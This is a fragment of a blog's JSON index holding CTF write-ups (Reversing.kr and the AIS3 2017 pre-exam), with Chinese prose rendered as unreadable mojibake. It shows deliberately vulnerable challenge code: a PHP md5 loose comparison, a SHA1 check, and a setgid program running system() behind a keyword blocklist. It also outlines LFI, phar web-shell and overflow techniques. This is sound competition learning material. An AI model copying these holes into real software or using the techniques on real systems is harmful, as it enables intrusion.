0x30]flag = &quot;&quot;for i in range(len(serial)): flag += chr(serial[i] ^ key[i%len(key)])print(flag) Easy Unpackç¸½ä¹‹é€™æ®¼é‚„æ»¿ç°¡å–®çš„ï¼Œè§£å£“ç¸®çµæŸæ™‚æœ‰å€‹jmpï¼Œè·Ÿéå»å°±æ˜¯OEPäº†æœ¬ä¾†ä»¥ç‚ºå…©å€‹æ®µæ˜¯åƒupxä¸€æ¨£ï¼Œä¸€å€‹æ®µè§£å£“ç¸®é€²å»å¦å¤–ä¸€å€‹æ®µå†åŸ·è¡Œï¼Œä½†æ˜¯å…¶ä¸­ä¸€å€‹æ®µå¥½åƒæ²’æœ‰åŸ·è¡Œæ¬Šé™ã€‚ Easy ELFä¸Ÿé€²gdbä¸‹å¹¾å€‹æ–·é»å°±å¯ä»¥çŸ¥é“è¦æ±‚è¼¸å…¥çš„é•·åº¦æ˜¯5ï¼Œä¸¦ä¸”å°å­—å…ƒåšxorç„¶å¾Œåšæª¢æŸ¥çœ‹æ˜¯è¦é€†ç®—å›ä¾†é‚„æ˜¯åšå€‹fuzzingå°±å¥½äº†","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"Reversing-kr","slug":"Reversing-kr","permalink":"http://blog.terrynini.tw/tags/Reversing-kr/"}]},{"title":"AIS3 pre-exam write up","slug":"2017-AIS3-pre-exam-write-up","date":"2017-07-14T18:22:24.000Z","updated":"2017-07-22T08:43:52.000Z","comments":true,"path":"tw/2017-AIS3-pre-exam-write-up/","permalink":"http://blog.terrynini.tw/tw/2017-AIS3-pre-exam-write-up/","excerpt":"ç¸½ä¹‹æˆ‘çµ‚æ–¼æ“Šæ•—æƒ°æ€§é–‹å§‹å¯«writeupäº†ï¼Œå»å¹´å‰›é–‹å§‹æ¥è§¸è³‡å®‰çš„æ™‚å€™å¥½åƒé‚„ä¸çŸ¥é“AIS3ï¼Œæ‰€ä»¥é€™æ˜¯ç¬¬ä¸€æ¬¡åƒåŠ AIS3ï¼Œç¸½ä¹‹æœ¬ä¾†æƒ³å¥½å¥½è§£é€†å‘çµæœè§£ä¸å‡ºä¾†åªæœ‰12åï¼ŒåŸ¹è¨“æ™‚é–“é‚„è·Ÿæˆ‘è¦å»æ—¥æœ¬çš„æ™‚é–“å®Œç¾çš„é‡ç–Šäº†ï¼Œæ…˜ã€‚","text":"ç¸½ä¹‹æˆ‘çµ‚æ–¼æ“Šæ•—æƒ°æ€§é–‹å§‹å¯«writeupäº†ï¼Œå»å¹´å‰›é–‹å§‹æ¥è§¸è³‡å®‰çš„æ™‚å€™å¥½åƒé‚„ä¸çŸ¥é“AIS3ï¼Œæ‰€ä»¥é€™æ˜¯ç¬¬ä¸€æ¬¡åƒåŠ AIS3ï¼Œç¸½ä¹‹æœ¬ä¾†æƒ³å¥½å¥½è§£é€†å‘çµæœè§£ä¸å‡ºä¾†åªæœ‰12åï¼ŒåŸ¹è¨“æ™‚é–“é‚„è·Ÿæˆ‘è¦å»æ—¥æœ¬çš„æ™‚é–“å®Œç¾çš„é‡ç–Šäº†ï¼Œæ…˜ã€‚ web1å…¶å¯¦é€™é¡Œåœ¨å¹¹å˜›æˆ‘å¿˜è¨˜äº† web2$msg = &quot;&quot;;if (isset($_POST[&quot;username&quot;]) and isset($_POST[&quot;password&quot;]))&#123; $username = (string)$_POST[&quot;username&quot;]; $password = (string)$_POST[&quot;password&quot;]; $success = false; foreach ($db as $row) &#123; if ($username == $row[&quot;username&quot;] and md5($password) == $row[&quot;password&quot;]) &#123; $msg = &quot;Successful login as $username. Here&#x27;s your flag: &quot;.$flag; $success = true; break; &#125; &#125; if (!$success) &#123; $msg = &quot;Invalid username or password.&quot;; &#125;&#125; é€™é¡Œè¦æ±‚ç™»å…¥ä¸€å€‹ç”¨phpå¯«å¾—ç°¡å–®ç¶²é ï¼Œphpåšçš„å°±æ˜¯ç”¨ä½ çš„usernameå»æ‰¾ä»–æœ¬ä¾†å°±å¯«å¥½çš„ä¸€ä¸²md5 hashç„¶å¾ŒæŠŠä½ è¼¸å…¥çš„passwordä¹Ÿåšmd5ä¹‹å¾Œä½¿ç”¨ == åšæ¯”è¼ƒï¼Œä¸é›£ç™¼ç¾æ˜¯phpå¼±æ¯”è¼ƒçš„åˆ©ç”¨ï¼Œä»”ç´°çœ‹å°±æœƒç™¼ç¾æœ‰ä¸€å€‹md5 hashæ˜¯ 0e é–‹é ­ï¼ŒæŠŠå°æ‡‰çš„usernameé‚„æœ‰ QNKCDZO ç•¶ä½œå¯†ç¢¼å°±æœƒæ‹¿åˆ°flagäº†ã€‚ web3é€™é¡Œæ ¹æœ¬æ˜¯å¾eduCTFæ‹¿éä¾†å†åˆ©ç”¨å§å“ˆå“ˆå“ˆç¸½ä¹‹æ˜¯LFI(local file inclusion)çš„æ¼æ´ï¼Œflagåœ¨å“ªæˆ‘å¤±æ†¶äº†ã€‚ web4é€™é¡Œä¹Ÿæœ‰LFIçš„æ¼æ´ï¼Œä¸éé LFIæŠŠindex.phpæ‹‰å‡ºä¾†æœƒç™¼ç¾ä»–æŠŠä¸€å€‹uploadçš„åŠŸèƒ½éš±è—èµ·ä¾†ï¼Œå¾ç¶²å€é€²å»ä¹‹å¾Œæœƒç™¼ç¾å®ƒæ˜¯ä¸€å€‹åªèƒ½ä¸Šå‚³jpgåœ–ç‰‡çš„åŠŸèƒ½ï¼Œç„¶å¾Œæœƒå‘Šè¨´ä½ ä¸Šå‚³ä¹‹å¾Œäº‚æ•¸ç”¢ç”Ÿçš„æª”åï¼Œä½†æ˜¯åªæ˜¯å–®ç´”éæ¿¾å‰¯æª”åï¼Œæ‰€ä»¥ç”¨pharæ­é…LFIçš„æ¼æ´å¯ä»¥åšå‡ºweb shellï¼Œå†ä¾†å°±åªæ˜¯æ‹¿flagè€Œå·²ã€‚ Pwn1é€™é¡Œä½ è¼¸å…¥ä»€éº¼ä»–å°±ç›´æ¥è·³åˆ°é‚£è£¡åŸ·è¡Œé€™æ¨£ï¼Œæœ‰å€‹functionå«åšyoucanseemeï¼Œè·³éå»åŸ·è¡Œå°±å¥½äº†ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯å› ç‚ºscanfåƒåˆ°ç©ºç™½æœƒåœæ­¢ï¼Œè€Œå‰›å¥½functionçš„é–‹é ­ä½å€æœƒè®“scnafåªåƒåˆ°ä¸€åŠï¼Œæ‰€ä»¥è¦å¾€å¾Œè·³ä¸€é»ã€‚ Pwn2ç”¨C++å¯«çš„ä¸€æ”¯ç¨‹å¼ï¼Œé›–ç„¶æ˜¯PEæª”æ¡ˆæ ¼å¼ï¼Œçµæœé€™é¡Œé€£åˆ†æä¹Ÿä¸ç”¨å°±çŸ¥é“è¦æ€æ¨£åšäº†ï¼Œé—œéµåœ¨ struct user &#123; char name[20]; int pass;&#125; ais3_user; å› ç‚ºC++ä¸­é€™ç¨®structçš„è¨˜æ†¶é«”æœƒé€£åœ¨ä¸€èµ·ï¼Œæ‰€ä»¥è¼¸å…¥nameçš„æ™‚å€™å¤šæ•²å¹¾å€‹æŠŠpasså£“éå»å°±å¥½äº†ã€‚ Reverse1ç›´æ¥åŸ·è¡Œï¼Œä¸­é–“æœƒç”¢ç”Ÿflagã€‚ Reverse2é€™é¡Œçµ¦äº†rev2å’Œencryptedå…©å€‹æª”æ¡ˆï¼Œencryptedæ˜¯è¢«rev2åŠ å¯†çš„flagï¼Œrev2åŠ å¯†çš„æ–¹å¼æ˜¯ç”¨srand(time(NULL))ä¹‹å¾Œï¼Œç„¶å¾Œä½¿ç”¨rand()ä¾†åŠ å¯†ï¼Œç¨‹å¼å…§æœ‰é¡¯ç¤ºé€™æ”¯ç¨‹å¼å»ºç«‹çš„æ™‚é–“æ˜¯å°ç£æ™‚é–“ 6&#x2F;26ã€‚å› ç‚ºtime(NULL)å¯¦éš›ä¸Šå‚³å›çš„æ˜¯ç›®å‰çš„unix timestampï¼Œsrandå†ä»¥æ­¤åšå‡ºäº‚æ•¸è¡¨ï¼Œå› æ­¤æŠŠ6&#x2F;26çš„unix timestampé–‹å§‹ä¸€ç›´ç”¨srandåšå‡ºäº‚æ•¸è¡¨ï¼Œç„¶å¾Œè·Ÿencryptedåšxorç„¶å¾Œæª¢æŸ¥æ˜¯ä¸æ˜¯flagå°±å¥½äº†ã€‚ Crypto1é€™é¡Œçš„flagè¢«ä¸‰å€‹æ•¸å€¼åšxorï¼Œä¸éä¸éœ€è¦åšå‡ºå€‹åˆ¥å€¼ï¼Œå› ç‚ºxorä¹‹å¾Œå®Œå…¨æ²’æœ‰å·®åˆ¥ï¼Œå› ç‚ºçŸ¥é“flagæ˜¯AIS3é–‹é ­ï¼Œæ‰€ä»¥æŠŠxorçš„å€¼è§£å‡ºä¾†å¾ŒæŠŠå‰©ä¸‹çš„éƒ¨åˆ†ä¹Ÿxorå‡ºä¾†å°±å¥½äº† #include &lt;stdio.h&gt;#include &lt;string.h&gt;int main()&#123; int val1 = ?????????, val2 = ?????????, val3 = ???????, val4 = ??????, i, *ptr; char flag[29] = &quot;????????????????????????????&quot;; // Hint: The flag begins with AIS3 for(i = 0, ptr = (int*)flag ; i &lt; 7 ; ++i) printf(&quot;%d\\n&quot;, ptr[i] ^ val1 ^ val2 ^ val3 ^ val4); /* 964600246 1376627084 1208859320 1482862807 1326295511 1181531558 2003814564 */ return 0;&#125; Crypto2å› ç‚ºç”¨äº†ECB mode ï¼Œæ‰€ä»¥æ¯å€‹å€å¡Šé–“æ²’æœ‰é—œè¯ï¼Œè€Œä¸”åŠ å¯†ç”¨çš„keyä¹Ÿä¸æœƒæ›ï¼Œé€ æˆcut &amp; paste attackã€‚ Crypto3 &amp; Crypto4sha1 collisionï¼Œé€™å…©é¡Œæ»¿æœ‰è¶£çš„ã€‚åœ¨åšæ¯”è¼ƒçš„æ™‚å€™ä½¿ç”¨çš„æ˜¯ === è€Œä¸æ˜¯ == æ‰€ä»¥ä¸èƒ½ç”¨é™£åˆ—çš„æ–¹æ³•ç¹éï¼Œå› æ­¤å°±æ˜¯åˆ©ç”¨googleåœ¨2æœˆæ™‚æ‰¾åˆ°çš„sha1ç¢°æ’ï¼ŒæŠŠå…©å€‹æ–‡ä»¶ä½œç‚ºusernameé‚„æœ‰passwordå‚³å…¥ã€‚Crypto4 å‰‡æ˜¯åˆ©ç”¨string() parseçš„æ™‚å€™æœƒè¢«\\00æˆªæ–·ï¼ŒåŠ å…¥é¡Œç›®è¦æ±‚çš„å­—ä¸²ï¼Œè€Œæœ€å¾Œä¸€å€‹æ¢ä»¶å‰‡æ˜¯sha1çš„çµæœé–‹é ­è¦æ˜¯f00dï¼Œåªè¦åœ¨æ–‡ä»¶å¾Œé¢åŠ å…¥ä¸€å †\\00ï¼Œçµæœå°±æœƒä¸ä¸€æ¨£ï¼Œæ‰€ä»¥å°±å¯«å€‹è…³æœ¬è‡ªå‹•æª¢æŸ¥å°±å¥½äº†ã€‚ &lt;?phpinclude(&quot;flag.php&quot;);if (isset($_GET[&quot;source&quot;])) &#123; show_source(__FILE__); exit();&#125;function startsWith($haystack, $needle)&#123; $length = strlen($needle); return (substr($haystack, 0, $length) === $needle);&#125;if (isset($_POST[&quot;username&quot;]) and isset($_POST[&quot;password&quot;]))&#123; $username = (string)$_POST[&quot;username&quot;]; $password = (string)$_POST[&quot;password&quot;]; $h1 = sha1($username); $h2 = sha1($password); if ($username == $password) &#123; $msg = &quot;Your password can not be your username.&quot;; &#125; else if ($h1 === $h2) &#123; $msg = &quot;Flag1: $flag1&quot;; if (strpos($username, &quot;Snoopy_do_not_like_cats_hahahaha&quot;) !== false and strpos($password, &quot;ddaa_is_PHD&quot;) !== false and startsWith($h1, &quot;f00d&quot;)) &#123; $msg .= &quot;&lt;/br&gt;&quot;; $msg .= &quot;Flag2: $flag2&quot;; &#125; &#125; else &#123; $msg = &quot;Invalid password.&quot;; &#125;&#125;?&gt; MISC2å°±åªé¡¯ç¤ºäº†I&#39;ve sent you something :)ï¼Œç¶²é è¨»è§£è£¡é¢æœ‰ä¸€å€‹imgçš„tag &lt;img src=&#39;sudoku.png&#39;&gt;ï¼ŒæŠŠè¨»è§£æ‹¿é–‹å¾Œæœƒé¡¯ç¤ºä¸€å¼µæ•¸ç¨çš„åœ–ç‰‡ï¼šç„¶å¾Œæˆ‘ä»¥ç‚ºé€™é¡Œæ˜¯steganographyï¼Œçµæœè·ŸåŸåœ–æ ¹æœ¬å°±é€£ä¸€bitéƒ½æ²’å·®åˆ¥å•Šã€‚ç”¨curlçœ‹headeræ‰æœƒç™¼ç¾ï¼š decodeå¾Œå°±æœƒå¾—åˆ°S74G32.phpï¼Œé€²å»å¾Œæœƒçœ‹åˆ°ä¸€å¼µpng: ç¸½ä¹‹æˆ‘çš„è†è“‹å‘Šè¨´æˆ‘flagä¸€å®šåœ¨ç™½è‰²çš„åœ°æ–¹ï¼Œå› ç‚ºä»–ä¹æˆæ˜¯png: MISC4é€™é¡Œè¦sshåˆ°ä¸€å°ä¸»æ©Ÿï¼Œç„¶å¾Œæ¬Šé™å¾ˆä½ï¼Œflagå°±åœ¨çœ¼å‰ä½†æ˜¯ä¸èƒ½catã€‚æœ‰ä¸‰å€‹æª”æ¡ˆflagã€shellã€shell.cï¼Œshell.cé•·é€™æ¨£ï¼š #include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int filter(char* cmd)&#123; int r=0; r += strstr(cmd, &quot;=&quot;)!=0; r += strstr(cmd, &quot;PATH&quot;)!=0; r += strstr(cmd, &quot;export&quot;)!=0; r += strstr(cmd, &quot;/&quot;)!=0; r += strstr(cmd, &quot;\\\\&quot;)!=0; r += strstr(cmd, &quot;`&quot;)!=0; r += strstr(cmd, &quot;flag&quot;)!=0; return r;&#125;extern char** environ;void delete_env()&#123; char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p));&#125;int main(int argc, char* argv[], char** envp)&#123; setregid(getegid(), -1); if(argc &lt; 2) &#123; return 0; &#125; delete_env(); putenv(&quot;PATH=/this_is_not_a_valid_path&quot;); if(filter(argv[1])) return 0; printf(&quot;%s\\n&quot;, argv[1]); system( argv[1] ); return 0;&#125; ç¸½ä¹‹åªèƒ½ç”¨shå…§å»ºçš„æŒ‡ä»¤echoè·Ÿpwdå•¥çš„ï¼ŒåŠ ä¸Šä¸€äº›ç¥å¥‡çš„æ±è¥¿å°±è®Šæˆï¼š","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"AIS3","slug":"AIS3","permalink":"http://blog.terrynini.tw/tags/AIS3/"}]}],"categories":[{"name":"Record","slug":"Record","permalink":"http://blog.terrynini.tw/categories/Record/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"},{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"},{"name":"TodayILearn","slug":"TodayILearn","permalink":"http://blog.terrynini.tw/categories/TodayILearn/"},{"name":"Reminder","slug":"Reminder","permalink":"http://blog.terrynini.tw/categories/Reminder/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"http://blog.terrynini.tw/tags/CSS/"},{"name":"Dev","slug":"Dev","permalink":"http://blog.terrynini.tw/tags/Dev/"},{"name":"Travel","slug":"Travel","permalink":"http://blog.terrynini.tw/tags/Travel/"},{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Balsn","slug":"Balsn","permalink":"http://blog.terrynini.tw/tags/Balsn/"},{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"Flare-On","slug":"Flare-On","permalink":"http://blog.terrynini.tw/tags/Flare-On/"},{"name":"AFL++","slug":"AFL","permalink":"http://blog.terrynini.tw/tags/AFL/"},{"name":"QEMU","slug":"QEMU","permalink":"http://blog.terrynini.tw/tags/QEMU/"},{"name":"OSCP","slug":"OSCP","permalink":"http://blog.terrynini.tw/tags/OSCP/"},{"name":"Web","slug":"Web","permalink":"http://blog.terrynini.tw/tags/Web/"},{"name":"Cryptography","slug":"Cryptography","permalink":"http://blog.terrynini.tw/tags/Cryptography/"},{"name":"Pwn","slug":"Pwn","permalink":"http://blog.terrynini.tw/tags/Pwn/"},{"name":"Misc","slug":"Misc","permalink":"http://blog.terrynini.tw/tags/Misc/"},{"name":"AIS3","slug":"AIS3","permalink":"http://blog.terrynini.tw/tags/AIS3/"},{"name":"Base64","slug":"Base64","permalink":"http://blog.terrynini.tw/tags/Base64/"},{"name":"AVX","slug":"AVX","permalink":"http://blog.terrynini.tw/tags/AVX/"},{"name":"Windows","slug":"Windows","permalink":"http://blog.terrynini.tw/tags/Windows/"},{"name":"Plaid","slug":"Plaid","permalink":"http://blog.terrynini.tw/tags/Plaid/"},{"name":"0CTF","slug":"0CTF","permalink":"http://blog.terrynini.tw/tags/0CTF/"},{"name":"browser","slug":"browser","permalink":"http://blog.terrynini.tw/tags/browser/"},{"name":"Chakra","slug":"Chakra","permalink":"http://blog.terrynini.tw/tags/Chakra/"},{"name":"JIT","slug":"JIT","permalink":"http://blog.terrynini.tw/tags/JIT/"},{"name":"CONFidence","slug":"CONFidence","permalink":"http://blog.terrynini.tw/tags/CONFidence/"},{"name":"FaceBook","slug":"FaceBook","permalink":"http://blog.terrynini.tw/tags/FaceBook/"},{"name":"GIF","slug":"GIF","permalink":"http://blog.terrynini.tw/tags/GIF/"},{"name":"Pragyan","slug":"Pragyan","permalink":"http://blog.terrynini.tw/tags/Pragyan/"},{"name":"Reversing-kr","slug":"Reversing-kr","permalink":"http://blog.terrynini.tw/tags/Reversing-kr/"},{"name":"RealWorldCTF","slug":"RealWorldCTF","permalink":"http://blog.terrynini.tw/tags/RealWorldCTF/"},{"name":"OS","slug":"OS","permalink":"http://blog.terrynini.tw/tags/OS/"},{"name":"ASIS","slug":"ASIS","permalink":"http://blog.terrynini.tw/tags/ASIS/"},{"name":"Algorithm","slug":"Algorithm","permalink":"http://blog.terrynini.tw/tags/Algorithm/"},{"name":"SECCON","slug":"SECCON","permalink":"http://blog.terrynini.tw/tags/SECCON/"},{"name":"HITCON","slug":"HITCON","permalink":"http://blog.terrynini.tw/tags/HITCON/"}]}